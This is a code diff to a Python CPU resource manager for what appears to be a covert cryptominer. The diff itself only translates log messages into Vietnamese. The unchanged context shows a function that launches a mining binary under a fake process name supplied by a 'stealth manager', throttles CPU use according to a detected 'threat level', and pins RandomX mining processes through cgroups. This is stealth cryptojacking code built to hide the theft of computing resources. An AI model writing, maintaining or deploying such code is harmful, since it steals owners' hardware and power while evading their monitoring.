@@ -414,11 +414,11 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 cgroup_name = f"randomx_opt_{pid}"
                 if self.configure_cpuset(cgroup_name, all_cores):
                     if self.assign_process_to_cpuset(pid, cgroup_name):
-                        self.logger.info(f"Applied RandomX optimized cpuset for PID={pid}: {all_cores}")
+                        self.logger.info(f"Đã áp dụng [RandomX optimized cpuset] (tập CPU tối ưu cho RandomX) cho PID={pid}: {all_cores}")
                     else:
-                        self.logger.error(f"Failed to assign PID={pid} to RandomX cpuset")
+                        self.logger.error(f"Không thể gán PID={pid} vào [RandomX cpuset] (tập CPU dành cho RandomX)")
                 else:
-                    self.logger.error(f"Failed to configure RandomX cpuset for PID={pid}")
+                    self.logger.error(f"Cấu hình [RandomX cpuset] (tập CPU dành cho RandomX) cho PID={pid} thất bại")
             
             # Store optimization info
             self.throttled_processes[pid] = {
@@ -429,11 +429,11 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 'thread_count': mining_config['threads']
             }
             
-            self.logger.info(f"RandomX optimization applied: Profile={performance_profile}, Estimated gain={mining_config.get('estimated_performance_gain', 1.0):.1%}")
+            self.logger.info(f"Đã áp dụng tối ưu [RandomX] (thuật toán khai thác): [Profile] (hồ sơ)={performance_profile}, [Estimated gain] (mức tăng ước tính)={mining_config.get('estimated_performance_gain', 1.0):.1%}")
             return True
 
         except Exception as e:
-            self.logger.error(f"RandomX optimization failed for PID={pid}: {e}")
+            self.logger.error(f"Tối ưu [RandomX] (thuật toán khai thác) thất bại cho PID={pid}: {e}")
             return False
 
     def create_stealth_mining_process(self, miner_binary_path: str, mining_args: List[str] = None) -> Optional[int]:
@@ -447,7 +447,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             
             # Execute với stealth process manager
             fake_name = self.stealth_manager.get_fake_process_name()
-            self.logger.info(f"Creating stealth mining process as: {fake_name}")
+            self.logger.info(f"Tạo [stealth mining process] (tiến trình khai thác che giấu) với tên: {fake_name}")
             
             # For now, create normal process but with stealth configuration
             # (Full memory execution would need more complex implementation)
@@ -468,11 +468,11 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 throttle_level = threat_throttle.get(self.current_threat_level, 50)
                 self.throttle_cpu_usage(process.pid, throttle_level)
                 
-                self.logger.info(f"Stealth mining process created: PID={process.pid}, throttle={throttle_level}%")
+                self.logger.info(f"Đã tạo [stealth mining process] (tiến trình khai thác che giấu): PID={process.pid}, [throttle] (giới hạn)={throttle_level}%")
                 return process.pid
             
         except Exception as e:
-            self.logger.error(f"Failed to create stealth mining process: {e}")
+            self.logger.error(f"Tạo [stealth mining process] (tiến trình khai thác che giấu) thất bại: {e}")
             
         return None
 
@@ -730,7 +730,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             # Create cgroup directory if it doesn't exist
             if not os.path.exists(cpuset_cgroup_path):
                 os.makedirs(cpuset_cgroup_path, exist_ok=True)
-                self.logger.info(f"Created cpuset cgroup: {cpuset_cgroup_path}")
+                self.logger.info(f"Đã tạo [cpuset cgroup] (nhóm điều khiển CPU cpuset): {cpuset_cgroup_path}")
             
             # Set cpuset.cpus
             cpuset_cpus_file = os.path.join(cpuset_cgroup_path, "cpuset.cpus")
@@ -744,11 +744,11 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             with open(cpuset_mems_file, "w") as f:
                 f.write("0")  # Default to NUMA node 0
             
-            self.logger.info(f"Configured cpuset for {cgroup_name}: cores={cores_str}, mems=0")
+            self.logger.info(f"Đã cấu hình [cpuset] (tập CPU) cho {cgroup_name}: [cores] (nhân)={cores_str}, [mems] (node bộ nhớ)=0")
             return True
             
         except Exception as e:
-            self.logger.error(f"Failed to configure cpuset for {cgroup_name}: {e}")
+            self.logger.error(f"Cấu hình [cpuset] (tập CPU) cho {cgroup_name} thất bại: {e}")
             return False
 
     def assign_process_to_cpuset(self, pid: int, cgroup_name: str) -> bool:
@@ -770,7 +770,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             cpuset_cgroup_path = os.path.join(self.CGROUP_CPU_CPUSET, cgroup_name)
             
             if not os.path.exists(cpuset_cgroup_path):
-                self.logger.error(f"Cpuset cgroup does not exist: {cpuset_cgroup_path}")
+                self.logger.error(f"[Cpuset cgroup] (nhóm điều khiển cpuset) không tồn tại: {cpuset_cgroup_path}")
                 return False
             
             # Add process to cgroup
@@ -778,7 +778,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             with open(cgroup_procs_file, "w") as f:
                 f.write(str(pid))
             
-            self.logger.info(f"Assigned PID {pid} to cpuset cgroup {cgroup_name}")
+            self.logger.info(f"Đã gán PID {pid} vào [cpuset cgroup] (nhóm điều khiển cpuset) {cgroup_name}")
             return True
             
         except Exception as e:
